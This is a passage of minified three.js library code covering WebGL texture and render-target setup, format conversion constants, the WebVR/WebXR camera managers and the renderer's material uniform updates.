if(i.depthBuffer&&i.stencilBuffer)n?(n=S(i),t.renderbufferStorageMultisample(36161,n,35056,i.width,i.height)):t.renderbufferStorage(36161,34041,i.width,i.height),t.framebufferRenderbuffer(36160,33306,36161,e);else{e=d(e=a.convert(i.texture.format),a.convert(i.texture.type)),n?(n=S(i),t.renderbufferStorageMultisample(36161,n,e,i.width,i.height)):t.renderbufferStorage(36161,e,i.width,i.height)}t.bindRenderbuffer(36161,null)}function S(t){return r.isWebGL2&&t.isWebGLMultisampleRenderTarget?Math.min(r.maxSamples,t.samples):0}var T,E=new WeakMap,C="undefined"!=typeof OffscreenCanvas,A=0,L=!1,P=!1;this.allocateTextureUnit=function(){var t=A;return t>=r.maxTextures&&console.warn("THREE.WebGLTextures: Trying to use "+t+" texture units while this GPU supports only "+r.maxTextures),A+=1,t},this.resetTextureUnits=function(){A=0},this.setTexture2D=g,this.setTexture2DArray=function(t,e){var r=n.get(t);0<t.version&&r.__version!==t.version?w(r,t,e):(i.activeTexture(33984+e),i.bindTexture(35866,r.__webglTexture))},this.setTexture3D=function(t,e){var r=n.get(t);0<t.version&&r.__version!==t.version?w(r,t,e):(i.activeTexture(33984+e),i.bindTexture(32879,r.__webglTexture))},this.setTextureCube=v,this.setTextureCubeDynamic=y,this.setupRenderTarget=function(e){var s=n.get(e),l=n.get(e.texture);e.addEventListener("dispose",m),l.__webglTexture=t.createTexture(),o.memory.textures++;var p=!0===e.isWebGLRenderTargetCube,f=!0===e.isWebGLMultisampleRenderTarget,v=c(e)||r.isWebGL2;if(p)for(s.__webglFramebuffer=[],f=0;6>f;f++)s.__webglFramebuffer[f]=t.createFramebuffer();else if(s.__webglFramebuffer=t.createFramebuffer(),f)if(r.isWebGL2){s.__webglMultisampledFramebuffer=t.createFramebuffer(),s.__webglColorRenderbuffer=t.createRenderbuffer(),t.bindRenderbuffer(36161,s.__webglColorRenderbuffer),f=a.convert(e.texture.format);var y=a.convert(e.texture.type);f=d(f,y),y=S(e),t.renderbufferStorageMultisample(36161,y,f,e.width,e.height),t.bindFramebuffer(36160,s.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(36160,36064,36161,s.__webglColorRenderbuffer),t.bindRenderbuffer(36161,null),e.depthBuffer&&(s.__webglDepthRenderbuffer=t.createRenderbuffer(),M(s.__webglDepthRenderbuffer,e,!0)),t.bindFramebuffer(36160,null)}else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.");if(p){for(i.bindTexture(34067,l.__webglTexture),x(34067,e.texture,v),f=0;6>f;f++)_(s.__webglFramebuffer[f],e,36064,34069+f);h(e.texture,v)&&u(34067,e.texture,e.width,e.height),i.bindTexture(34067,null)}else i.bindTexture(3553,l.__webglTexture),x(3553,e.texture,v),_(s.__webglFramebuffer,e,36064,3553),h(e.texture,v)&&u(3553,e.texture,e.width,e.height),i.bindTexture(3553,null);if(e.depthBuffer){if(s=n.get(e),l=!0===e.isWebGLRenderTargetCube,e.depthTexture){if(l)throw Error("target.depthTexture not supported in Cube render targets");if(e&&e.isWebGLRenderTargetCube)throw Error("Depth Texture with cube render targets is not supported");if(t.bindFramebuffer(36160,s.__webglFramebuffer),!e.depthTexture||!e.depthTexture.isDepthTexture)throw Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");if(n.get(e.depthTexture).__webglTexture&&e.depthTexture.image.width===e.width&&e.depthTexture.image.height===e.height||(e.depthTexture.image.width=e.width,e.depthTexture.image.height=e.height,e.depthTexture.needsUpdate=!0),g(e.depthTexture,0),s=n.get(e.depthTexture).__webglTexture,1026===e.depthTexture.format)t.framebufferTexture2D(36160,36096,3553,s,0);else{if(1027!==e.depthTexture.format)throw Error("Unknown depthTexture format");t.framebufferTexture2D(36160,33306,3553,s,0)}}else if(l)for(s.__webglDepthbuffer=[],l=0;6>l;l++)t.bindFramebuffer(36160,s.__webglFramebuffer[l]),s.__webglDepthbuffer[l]=t.createRenderbuffer(),M(s.__webglDepthbuffer[l],e);else t.bindFramebuffer(36160,s.__webglFramebuffer),s.__webglDepthbuffer=t.createRenderbuffer(),M(s.__webglDepthbuffer,e);t.bindFramebuffer(36160,null)}},this.updateRenderTargetMipmap=function(t){var e=t.texture,a=c(t)||r.isWebGL2;if(h(e,a)){a=t.isWebGLRenderTargetCube?34067:3553;var o=n.get(e).__webglTexture;i.bindTexture(a,o),u(a,e,t.width,t.height),i.bindTexture(a,null)}},this.updateMultisampleRenderTarget=function(e){if(e.isWebGLMultisampleRenderTarget)if(r.isWebGL2){var i=n.get(e);t.bindFramebuffer(36008,i.__webglMultisampledFramebuffer),t.bindFramebuffer(36009,i.__webglFramebuffer),i=e.width;var a=e.height,o=16384;e.depthBuffer&&(o|=256),e.stencilBuffer&&(o|=1024),t.blitFramebuffer(0,0,i,a,0,0,i,a,o,9728)}else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.")},this.safeSetTexture2D=function(t,e){t&&t.isWebGLRenderTarget&&(!1===L&&(console.warn("THREE.WebGLTextures.safeSetTexture2D: don't use render targets as textures. Use their .texture property instead."),L=!0),t=t.texture),g(t,e)},this.safeSetTextureCube=function(t,e){t&&t.isWebGLRenderTargetCube&&(!1===P&&(console.warn("THREE.WebGLTextures.safeSetTextureCube: don't use cube render targets as textures. Use their .texture property instead."),P=!0),t=t.texture),t&&t.isCubeTexture||Array.isArray(t.image)&&6===t.image.length?v(t,e):y(t,e)}}function Pe(t,e,i){return{convert:function(t){if(1e3===t)return 10497;if(1001===t)return 33071;if(1002===t)return 33648;if(1003===t)return 9728;if(1004===t)return 9984;if(1005===t)return 9986;if(1006===t)return 9729;if(1007===t)return 9985;if(1008===t)return 9987;if(1009===t)return 5121;if(1017===t)return 32819;if(1018===t)return 32820;if(1019===t)return 33635;if(1010===t)return 5120;if(1011===t)return 5122;if(1012===t)return 5123;if(1013===t)return 5124;if(1014===t)return 5125;if(1015===t)return 5126;if(1016===t){if(i.isWebGL2)return 5131;var n=e.get("OES_texture_half_float");if(null!==n)return n.HALF_FLOAT_OES}if(1021===t)return 6406;if(1022===t)return 6407;if(1023===t)return 6408;if(1024===t)return 6409;if(1025===t)return 6410;if(1026===t)return 6402;if(1027===t)return 34041;if(1028===t)return 6403;if(100===t)return 32774;if(101===t)return 32778;if(102===t)return 32779;if(200===t)return 0;if(201===t)return 1;if(202===t)return 768;if(203===t)return 769;if(204===t)return 770;if(205===t)return 771;if(206===t)return 772;if(207===t)return 773;if(208===t)return 774;if(209===t)return 775;if(210===t)return 776;if((33776===t||33777===t||33778===t||33779===t)&&null!==(n=e.get("WEBGL_compressed_texture_s3tc"))){if(33776===t)return n.COMPRESSED_RGB_S3TC_DXT1_EXT;if(33777===t)return n.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(33778===t)return n.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(33779===t)return n.COMPRESSED_RGBA_S3TC_DXT5_EXT}if((35840===t||35841===t||35842===t||35843===t)&&null!==(n=e.get("WEBGL_compressed_texture_pvrtc"))){if(35840===t)return n.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(35841===t)return n.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(35842===t)return n.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(35843===t)return n.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(36196===t&&null!==(n=e.get("WEBGL_compressed_texture_etc1")))return n.COMPRESSED_RGB_ETC1_WEBGL;if((37808===t||37809===t||37810===t||37811===t||37812===t||37813===t||37814===t||37815===t||37816===t||37817===t||37818===t||37819===t||37820===t||37821===t)&&null!==(n=e.get("WEBGL_compressed_texture_astc")))return t;if(103===t||104===t){if(i.isWebGL2){if(103===t)return 32775;if(104===t)return 32776}if(null!==(n=e.get("EXT_blend_minmax"))){if(103===t)return n.MIN_EXT;if(104===t)return n.MAX_EXT}}if(1020===t){if(i.isWebGL2)return 34042;if(null!==(n=e.get("WEBGL_depth_texture")))return n.UNSIGNED_INT_24_8_WEBGL}return 0}}}function Re(){p.call(this),this.type="Group"}function Oe(t){Z.call(this),this.cameras=t||[]}function Ie(t,e,i){Os.setFromMatrixPosition(e.matrixWorld),Is.setFromMatrixPosition(i.matrixWorld);var n=Os.distanceTo(Is),r=e.projectionMatrix.elements,a=i.projectionMatrix.elements,o=r[14]/(r[10]-1);i=r[14]/(r[10]+1);var s=(r[9]+1)/r[5],l=(r[9]-1)/r[5],c=(r[8]-1)/r[0],h=(a[8]+1)/a[0];r=o*c,a=o*h,c=(h=n/(-c+h))*-c,e.matrixWorld.decompose(t.position,t.quaternion,t.scale),t.translateX(c),t.translateZ(h),t.matrixWorld.compose(t.position,t.quaternion,t.scale),t.matrixWorldInverse.getInverse(t.matrixWorld),e=o+h,o=i+h,t.projectionMatrix.makePerspective(r-c,a+(n-c),s*i/o*e,l*i/o*e,e,o)}function ze(t){function e(){return null!==d&&!0===d.isPresenting}function a(){if(e()){var i=d.getEyeParameters("left");l=2*i.renderWidth*y,c=i.renderHeight*y,E=t.getPixelRatio(),t.getSize(C),t.setDrawingBufferSize(l,c,1),M.viewport.set(0,0,l/2,c),S.viewport.set(l/2,0,l/2,c),L.start(),u.dispatchEvent({type:"sessionstart"})}else u.enabled&&t.setDrawingBufferSize(C.width,C.height,E),L.stop(),u.dispatchEvent({type:"sessionend"})}function o(t,e){null!==e&&4===e.length&&t.set(e[0]*l,e[1]*c,e[2]*l,e[3]*c)}var l,c,u=this,d=null,p=null,f=null,m=[],g=new h,v=new h,y=1,x="local-floor";"undefined"!=typeof window&&"VRFrameData"in window&&(p=new window.VRFrameData,window.addEventListener("vrdisplaypresentchange",a,!1));var b=new h,w=new n,_=new r,M=new Z;M.viewport=new s,M.layers.enable(1);var S=new Z;S.viewport=new s,S.layers.enable(2);var T=new Oe([M,S]);T.layers.enable(1),T.layers.enable(2);var E,C=new i,A=[];this.enabled=!1,this.getController=function(t){var e=m[t];return void 0===e&&((e=new Re).matrixAutoUpdate=!1,e.visible=!1,m[t]=e),e},this.getDevice=function(){return d},this.setDevice=function(t){void 0!==t&&(d=t),L.setContext(t)},this.setFramebufferScaleFactor=function(t){y=t},this.setReferenceSpaceType=function(t){x=t},this.setPoseTarget=function(t){void 0!==t&&(f=t)},this.getCamera=function(t){var i="local-floor"===x?1.6:0;if(!1===e())return t.position.set(0,i,0),t.rotation.set(0,0,0),t;if(d.depthNear=t.near,d.depthFar=t.far,d.getFrameData(p),"local-floor"===x){var n=d.stageParameters;n?g.fromArray(n.sittingToStandingTransform):g.makeTranslation(0,i,0)}i=p.pose,(n=null!==f?f:t).matrix.copy(g),n.matrix.decompose(n.position,n.quaternion,n.scale),null!==i.orientation&&(w.fromArray(i.orientation),n.quaternion.multiply(w)),null!==i.position&&(w.setFromRotationMatrix(g),_.fromArray(i.position),_.applyQuaternion(w),n.position.add(_)),n.updateMatrixWorld(),M.near=t.near,S.near=t.near,M.far=t.far,S.far=t.far,M.matrixWorldInverse.fromArray(p.leftViewMatrix),S.matrixWorldInverse.fromArray(p.rightViewMatrix),v.getInverse(g),"local-floor"===x&&(M.matrixWorldInverse.multiply(v),S.matrixWorldInverse.multiply(v)),null!==(t=n.parent)&&(b.getInverse(t.matrixWorld),M.matrixWorldInverse.multiply(b),S.matrixWorldInverse.multiply(b)),M.matrixWorld.getInverse(M.matrixWorldInverse),S.matrixWorld.getInverse(S.matrixWorldInverse),M.projectionMatrix.fromArray(p.leftProjectionMatrix),S.projectionMatrix.fromArray(p.rightProjectionMatrix),Ie(T,M,S),(t=d.getLayers()).length&&(t=t[0],o(M.viewport,t.leftBounds),o(S.viewport,t.rightBounds));t:for(t=0;t<m.length;t++){i=m[t];e:{n=t;for(var r=navigator.getGamepads&&navigator.getGamepads(),a=0,s=0,l=r.length;a<l;a++){var c=r[a];if(c&&("Daydream Controller"===c.id||"Gear VR Controller"===c.id||"Oculus Go Controller"===c.id||"OpenVR Gamepad"===c.id||c.id.startsWith("Oculus Touch")||c.id.startsWith("HTC Vive Focus")||c.id.startsWith("Spatial Controller"))){if(s===n){n=c;break e}s++}}n=void 0}if(void 0!==n&&void 0!==n.pose){if(null===n.pose)break t;!1===(r=n.pose).hasPosition&&i.position.set(.2,-.6,-.05),null!==r.position&&i.position.fromArray(r.position),null!==r.orientation&&i.quaternion.fromArray(r.orientation),i.matrix.compose(i.position,i.quaternion,i.scale),i.matrix.premultiply(g),i.matrix.decompose(i.position,i.quaternion,i.scale),i.matrixWorldNeedsUpdate=!0,i.visible=!0,r="Daydream Controller"===n.id?0:1,void 0===A[t]&&(A[t]=!1),A[t]!==n.buttons[r].pressed&&(A[t]=n.buttons[r].pressed,!0===A[t]?i.dispatchEvent({type:"selectstart"}):(i.dispatchEvent({type:"selectend"}),i.dispatchEvent({type:"select"})))}else i.visible=!1}return T},this.getStandingMatrix=function(){return g},this.isPresenting=e;var L=new it;this.setAnimationLoop=function(t){L.setAnimationLoop(t),e()&&L.start()},this.submitFrame=function(){e()&&d.submitFrame()},this.dispose=function(){"undefined"!=typeof window&&window.removeEventListener("vrdisplaypresentchange",a)},this.setFrameOfReferenceType=function(){console.warn("THREE.WebVRManager: setFrameOfReferenceType() has been deprecated.")}}function De(t,e){function i(){return null!==c&&null!==u}function n(t){for(var e=0;e<f.length;e++)m[e]===t.inputSource&&f[e].dispatchEvent({type:t.type})}function r(){t.setFramebuffer(null),t.setRenderTarget(t.getRenderTarget()),b.stop(),l.dispatchEvent({type:"sessionend"})}function a(t){u=t,b.setContext(c),b.start(),l.dispatchEvent({type:"sessionstart"})}function o(t,e){null===e?t.matrixWorld.copy(t.matrix):t.matrixWorld.multiplyMatrices(e.matrixWorld,t.matrix),t.matrixWorldInverse.getInverse(t.matrixWorld)}var l=this,c=null,u=null,d="local-floor",p=null,f=[],m=[],g=new Z;g.layers.enable(1),g.viewport=new s;var v=new Z;v.layers.enable(2),v.viewport=new s;var y=new Oe([g,v]);y.layers.enable(1),y.layers.enable(2),this.enabled=!1,this.getController=function(t){var e=f[t];return void 0===e&&((e=new Re).matrixAutoUpdate=!1,e.visible=!1,f[t]=e),e},this.setFramebufferScaleFactor=function(t){},this.setReferenceSpaceType=function(t){d=t},this.getSession=function(){return c},this.setSession=function(t){null!==(c=t)&&(c.addEventListener("select",n),c.addEventListener("selectstart",n),c.addEventListener("selectend",n),c.addEventListener("end",r),c.updateRenderState({baseLayer:new XRWebGLLayer(c,e)}),c.requestReferenceSpace(d).then(a),m=c.inputSources,c.addEventListener("inputsourceschange",(function(){m=c.inputSources,console.log(m);for(var t=0;t<f.length;t++)f[t].userData.inputSource=m[t]})))},this.getCamera=function(t){if(i()){var e=t.parent,n=y.cameras;o(y,e);for(var r=0;r<n.length;r++)o(n[r],e);for(t.matrixWorld.copy(y.matrixWorld),r=0,e=(t=t.children).length;r<e;r++)t[r].updateMatrixWorld(!0);return Ie(y,g,v),y}return t},this.isPresenting=i;var x=null,b=new it;b.setAnimationLoop((function(e,i){if(null!==(p=i.getViewerPose(u))){var n=p.views,r=c.renderState.baseLayer;t.setFramebuffer(r.framebuffer);for(var a=0;a<n.length;a++){var o=n[a],s=r.getViewport(o),l=y.cameras[a];l.matrix.fromArray(o.transform.inverse.matrix).getInverse(l.matrix),l.projectionMatrix.fromArray(o.projectionMatrix),l.viewport.set(s.x,s.y,s.width,s.height),0===a&&y.matrix.copy(l.matrix)}}for(a=0;a<f.length;a++)n=f[a],(r=m[a])&&null!==(r=i.getPose(r.targetRaySpace,u))?(n.matrix.fromArray(r.transform.matrix),n.matrix.decompose(n.position,n.rotation,n.scale),n.visible=!0):n.visible=!1;x&&x(e)})),this.setAnimationLoop=function(t){x=t},this.dispose=function(){},this.getStandingMatrix=function(){return console.warn("THREE.WebXRManager: getStandingMatrix() is no longer needed."),new h},this.getDevice=function(){console.warn("THREE.WebXRManager: getDevice() has been deprecated.")},this.setDevice=function(){console.warn("THREE.WebXRManager: setDevice() has been deprecated.")},this.setFrameOfReferenceType=function(){console.warn("THREE.WebXRManager: setFrameOfReferenceType() has been deprecated.")},this.submitFrame=function(){}}function Ne(t){var e;function n(){R=new ht(Nt),(O=new lt(Nt,R,t)).isWebGL2||(R.get("WEBGL_depth_texture"),R.get("OES_texture_float"),R.get("OES_texture_half_float"),R.get("OES_texture_half_float_linear"),R.get("OES_standard_derivatives"),R.get("OES_element_index_uint"),R.get("ANGLE_instanced_arrays")),R.get("OES_texture_float_linear"),Y=new Pe(Nt,R,O),(I=new Ae(Nt,R,Y,O)).scissor(_t.copy(At).multiplyScalar(Et).floor()),I.viewport(wt.copy(Ct).multiplyScalar(Et).floor()),z=new pt(Nt),D=new me,N=new Le(Nt,R,I,D,O,Y,z),k=new nt(Nt),B=new ut(Nt,k,z),F=new gt(B,z),V=new mt(Nt),H=new fe($,R,O),G=new xe,j=new Se,U=new ot($,I,F,T),W=new st(Nt,R,z,O),X=new dt(Nt,R,z,O),z.programs=H.programs,$.capabilities=O,$.extensions=R,$.properties=D,$.renderLists=G,$.state=I,$.info=z}function a(t){t.preventDefault(),console.log("THREE.WebGLRenderer: Context Lost."),Z=!0}function o(){console.log("THREE.WebGLRenderer: Context Restored."),Z=!1,n()}function l(t){(t=t.target).removeEventListener("dispose",l),c(t),D.remove(t)}function c(t){var e=D.get(t).program;t.program=void 0,void 0!==e&&H.releaseProgram(e)}function u(t,e,i,n){if(!1!==t.visible){if(t.layers.test(e.layers))if(t.isGroup)i=t.renderOrder;else if(t.isLOD)!0===t.autoUpdate&&t.update(e);else if(t.isLight)P.pushLight(t),t.castShadow&&P.pushShadow(t);else if(t.isSprite){if(!t.frustumCulled||Pt.intersectsSprite(t)){n&&Dt.setFromMatrixPosition(t.matrixWorld).applyMatrix4(zt);var r=F.update(t),a=t.material;a.visible&&L.push(t,r,a,i,Dt.z,null)}}else if(t.isImmediateRenderObject)n&&Dt.setFromMatrixPosition(t.matrixWorld).applyMatrix4(zt),L.push(t,null,t.material,i,Dt.z,null);else if((t.isMesh||t.isLine||t.isPoints)&&(t.isSkinnedMesh&&t.skeleton.update(),!t.frustumCulled||Pt.intersectsObject(t)))if(n&&Dt.setFromMatrixPosition(t.matrixWorld).applyMatrix4(zt),r=F.update(t),a=t.material,Array.isArray(a))for(var o=r.groups,s=0,l=o.length;s<l;s++){var c=o[s],h=a[c.materialIndex];h&&h.visible&&L.push(t,r,h,i,Dt.z,c)}else a.visible&&L.push(t,r,a,i,Dt.z,null);for(s=0,l=(t=t.children).length;s<l;s++)u(t[s],e,i,n)}}function d(t,e,i,n){for(var r=0,a=t.length;r<a;r++){var o=t[r],s=o.object,l=o.geometry,c=void 0===n?o.material:n;if(o=o.group,i.isArrayCamera){bt=i;for(var h=i.cameras,u=0,d=h.length;u<d;u++){var f=h[u];s.layers.test(f.layers)&&(I.viewport(wt.copy(f.viewport)),P.setupLights(f),p(s,e,f,l,c,o))}}else bt=null,p(s,e,i,l,c,o)}}function p(t,i,n,r,a,o){if(t.onBeforeRender($,i,n,r,a,o),P=j.get(i,bt||n),t.modelViewMatrix.multiplyMatrices(n.matrixWorldInverse,t.matrixWorld),t.normalMatrix.getNormalMatrix(t.modelViewMatrix),t.isImmediateRenderObject){I.setMaterial(a);var s=m(n,i.fog,a,t);vt=e=null,yt=!1,function(t,e){t.render((function(t){$.renderBufferImmediate(t,e)}))}(t,s)}else $.renderBufferDirect(n,i.fog,r,a,t,o);t.onAfterRender($,i,n,r,a,o),P=j.get(i,bt||n)}function f(t,e,i){var n=D.get(t),r=P.state.lights,a=r.state.version;i=H.getParameters(t,r.state,P.state.shadowsArray,e,Rt.numPlanes,Rt.numIntersection,i);var o=H.getProgramCode(t,i),s=n.program,h=!0;if(void 0===s)t.addEventListener("dispose",l);else if(s.code!==o)c(t);else{if(n.lightsStateVersion!==a)n.lightsStateVersion=a;else if(void 0!==i.shaderID)return;h=!1}if(h&&(i.shaderID?(o=xs[i.shaderID],n.shader={name:t.type,uniforms:q(o.uniforms),vertexShader:o.vertexShader,fragmentShader:o.fragmentShader}):n.shader={name:t.type,uniforms:t.uniforms,vertexShader:t.vertexShader,fragmentShader:t.fragmentShader},t.onBeforeCompile(n.shader,$),o=H.getProgramCode(t,i),s=H.acquireProgram(t,n.shader,i,o),n.program=s,t.program=s),i=s.getAttributes(),t.morphTargets)for(o=t.numSupportedMorphTargets=0;o<$.maxMorphTargets;o++)0<=i["morphTarget"+o]&&t.numSupportedMorphTargets++;if(t.morphNormals)for(o=t.numSupportedMorphNormals=0;o<$.maxMorphNormals;o++)0<=i["morphNormal"+o]&&t.numSupportedMorphNormals++;i=n.shader.uniforms,(t.isShaderMaterial||t.isRawShaderMaterial)&&!0!==t.clipping||(n.numClippingPlanes=Rt.numPlanes,n.numIntersection=Rt.numIntersection,i.clippingPlanes=Rt.uniform),n.fog=e,n.lightsStateVersion=a,t.lights&&(i.ambientLightColor.value=r.state.ambient,i.lightProbe.value=r.state.probe,i.directionalLights.value=r.state.directional,i.spotLights.value=r.state.spot,i.rectAreaLights.value=r.state.rectArea,i.pointLights.value=r.state.point,i.hemisphereLights.value=r.state.hemi,i.directionalShadowMap.value=r.state.directionalShadowMap,i.directionalShadowMatrix.value=r.state.directionalShadowMatrix,i.spotShadowMap.value=r.state.spotShadowMap,i.spotShadowMatrix.value=r.state.spotShadowMatrix,i.pointShadowMap.value=r.state.pointShadowMap,i.pointShadowMatrix.value=r.state.pointShadowMatrix),t=n.program.getUniforms(),t=ee.seqWithValue(t.seq,i),n.uniformsList=t}function m(t,e,i,n){N.resetTextureUnits();var r=D.get(i),a=P.state.lights;Ot&&(It||t!==xt)&&Rt.setState(i.clippingPlanes,i.clipIntersection,i.clipShadows,t,r,t===xt&&i.id===ft),!1===i.needsUpdate&&(void 0===r.program||i.fog&&r.fog!==e||i.lights&&r.lightsStateVersion!==a.state.version?i.needsUpdate=!0:void 0===r.numClippingPlanes||r.numClippingPlanes===Rt.numPlanes&&r.numIntersection===Rt.numIntersection||(i.needsUpdate=!0)),i.needsUpdate&&(f(i,e,n),i.needsUpdate=!1);var o=!1,s=!1,l=!1,c=(a=r.program).getUniforms(),h=r.shader.uniforms;if(I.useProgram(a.program)&&(l=s=o=!0),i.id!==ft&&(ft=i.id,s=!0),(o||xt!==t)&&(c.setValue(Nt,"projectionMatrix",t.projectionMatrix),O.logarithmicDepthBuffer&&c.setValue(Nt,"logDepthBufFC",2/(Math.log(t.far+1)/Math.LN2)),xt!==t&&(xt=t,l=s=!0),(i.isShaderMaterial||i.isMeshPhongMaterial||i.isMeshStandardMaterial||i.envMap)&&(void 0!==(o=c.map.cameraPosition)&&o.setValue(Nt,Dt.setFromMatrixPosition(t.matrixWorld))),(i.isMeshPhongMaterial||i.isMeshLambertMaterial||i.isMeshBasicMaterial||i.isMeshStandardMaterial||i.isShaderMaterial||i.skinning)&&c.setValue(Nt,"viewMatrix",t.matrixWorldInverse)),i.skinning&&(c.setOptional(Nt,n,"bindMatrix"),c.setOptional(Nt,n,"bindMatrixInverse"),t=n.skeleton))if(o=t.bones,O.floatVertexTextures){if(void 0===t.boneTexture){o=Math.sqrt(4*o.length),o=Ca.ceilPowerOfTwo(o),o=Math.max(o,4);var u=new Float32Array(o*o*4);u.set(t.boneMatrices);var d=new Q(u,o,o,1023,1015);d.needsUpdate=!0,t.boneMatrices=u,t.boneTexture=d,t.boneTextureSize=o}c.setValue(Nt,"boneTexture",t.boneTexture,N),c.setValue(Nt,"boneTextureSize",t.boneTextureSize)}else c.setOptional(Nt,t,"boneMatrices");return s&&(c.setValue(Nt,"toneMappingExposure",$.toneMappingExposure),c.setValue(Nt,"toneMappingWhitePoint",$.toneMappingWhitePoint),i.lights&&(s=l,h.ambientLightColor.needsUpdate=s,h.lightProbe.needsUpdate=s,h.directionalLights.needsUpdate=s,h.pointLights.needsUpdate=s,h.spotLights.needsUpdate=s,h.rectAreaLights.needsUpdate=s,h.hemisphereLights.needsUpdate=s),e&&i.fog&&(h.fogColor.value.copy(e.color),e.isFog?(h.fogNear.value=e.near,h.fogFar.value=e.far):e.isFogExp2&&(h.fogDensity.value=e.density)),i.isMeshBasicMaterial?g(h,i):i.isMeshLambertMaterial?(g(h,i),i.emissiveMap&&(h.emissiveMap.value=i.emissiveMap)):i.isMeshPhongMaterial?(g(h,i),i.isMeshToonMaterial?(v(h,i),i.gradientMap&&(h.gradientMap.value=i.gradientMap)):v(h,i)):i.isMeshStandardMaterial?(g(h,i),i.isMeshPhysicalMaterial?(y(h,i),h.reflectivity.value=i.reflectivity,h.clearcoat.value=i.clearcoat,h.clearcoatRoughness.value=i.clearcoatRoughness,i.sheen&&h.sheen.value.copy(i.sheen),i.clearcoatNormalMap&&(h.clearcoatNormalScale.value.copy(i.clearcoatNormalScale),h.clearcoatNormalMap.value=i.clearcoatNormalMap,1===i.side&&h.clearcoatNormalScale.value.negate()),h.transparency.value=i.transparency):y(h,i)):i.isMeshMatcapMaterial?(g(h,i),i.matcap&&(h.matcap.value=i.matcap),i.bumpMap&&(h.bumpMap.value=i.bumpMap,h.bumpScale.value=i.bumpScale,1===i.side&&(h.bumpScale.value*=-1)),i.normalMap&&(h.normalMap.value=i.normalMap,h.normalScale.value.copy(i.normalScale),1===i.side&&h.normalScale.value.negate()),i.displacementMap&&(h.displacementMap.value=i.displacementMap,h.displacementScale.value=i.displacementScale,h.displacementBias.value=i.displacementBias)):i.isMeshDepthMaterial?(g(h,i),i.displacementMap&&(h.displacementMap.value=i.displacementMap,h.displacementScale.value=i.displacementScale,h.displacementBias.value=i.displacementBias)):i.isMeshDistanceMaterial?(g(h,i),i.displacementMap&&(h.displacementMap.value=i.displacementMap,h.displacementScale.value=i.displacementScale,h.displacementBias.value=i.displacementBias),h.referencePosition.value.copy(i.referencePosition),h.nearDistance.value=i.nearDistance,h.farDistance.value=i.farDistance):i.isMeshNormalMaterial?(g(h,i),i.bumpMap&&(h.bumpMap.value=i.bumpMap,h.bumpScale.value=i.bumpScale,1===i.side&&(h.bumpScale.value*=-1)),i.normalMap&&(h.normalMap.value=i.normalMap,h.normalScale.value.copy(i.normalScale),1===i.side&&h.normalScale.value.negate()),i.displacementMap&&(h.displacementMap.value=i.displacementMap,h.displacementScale.value=i.displacementScale,h.displacementBias.value=i.displacementBias)):i.isLineBasicMaterial?(h.diffuse.value.copy(i.color),h.opacity.value=i.opacity,i.isLineDashedMaterial&&(h.dashSize.value=i.dashSize,h.totalSize.value=i.dashSize+i.gapSize,h.scale.value=i.scale)):i.isPointsMaterial?(h.diffuse.value.copy(i.color),h.opacity.value=i.opacity,h.size.value=i.size*Et,h.scale.value=.5*Tt,h.map.value=i.map,null!==i.map&&(!0===i.map.matrixAutoUpdate&&i.map.updateMatrix(),h.uvTransform.value.copy(i.map.matrix))):i.isSpriteMaterial?(h.diffuse.value.copy(i.color),h.opacity.value=i.opacity,h.rotation.value=i.rotation,h.map.value=i.map,null!==i.map&&(!0===i.map.matrixAutoUpdate&&i.map.updateMatrix(),h.uvTransform.value.copy(i.map.matrix))):i.isShadowMaterial&&(h.color.value.copy(i.color),h.opacity.value=i.opacity),void 0!==h.ltc_1&&(h.ltc_1.value=ys.LTC_1),void 0!==h.ltc_2&&(h.ltc_2.value=ys.LTC_2),ee.upload(Nt,r.uniformsList,h,N)),i.isShaderMaterial&&!0===i.uniformsNeedUpdate&&(ee.upload(Nt,r.uniformsList,h,N),i.uniformsNeedUpdate=!1),i.isSpriteMaterial&&c.setValue(Nt,"center",n.center),c.setValue(Nt,"modelViewMatrix",n.modelViewMatrix),c.setValue(Nt,"normalMatrix",n.normalMatrix),c.setValue(Nt,"modelMatrix",n.matrixWorld),a}function g(t,e){if(t.opacity.value=e.opacity,e.color&&t.diffuse.value.copy(e.color),e.emissive&&t.emissive.value.copy(e.emissive).multiplyScalar(e.emissiveIntensity),e.map&&(t.map.value=e.map),e.alphaMap&&(t.alphaMap.value=e.alphaMap),e.specularMap&&(t.specularMap.value=e.specularMap),e.envMap&&(t.envMap.value=e.envMap,t.flipEnvMap.value=e.envMap.isCubeTexture?-1:1,t.reflectivity.value=e.reflectivity,t.refractionRatio.value=e.refractionRatio,t.maxMipLevel.value=D.get(e.envMap).__maxMipLevel),e.lightMap&&(t.lightMap.value=e.lightMap,t.lightMapIntensity.value=e.lightMapIntensity),e.aoMap&&(t.aoMap.value=e.aoMap,t.aoMapIntensity.value=e.aoMapIntensity),e.map)var i=e.map;else e.specularMap?i=e.specularMap:e.displacementMap?i=e.displacementMap:e.normalMap?i=e.normalMap:e.bumpMap?i=e.bumpMap:e.roughnessMap?i=e.roughnessMap:e.metalnessMap?i=e.metalnessMap:e.alphaMap?i=e.alphaMap:e.emissiveMap&&(i=e.emissiveMap);void 0!==i&&(i.isWebGLRenderTarget&&(i=i.texture),!0===i.matrixAutoUpdate&&i.updateMatrix(),t.uvTransform.value.copy(i.matrix))}function v(t,e){t.specular.value.copy(e.specular),t.shininess.value=Math.max(e.shininess,1e-4),e.emissiveMap&&(t.emissiveMap.value=e.emissiveMap),e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias)}function 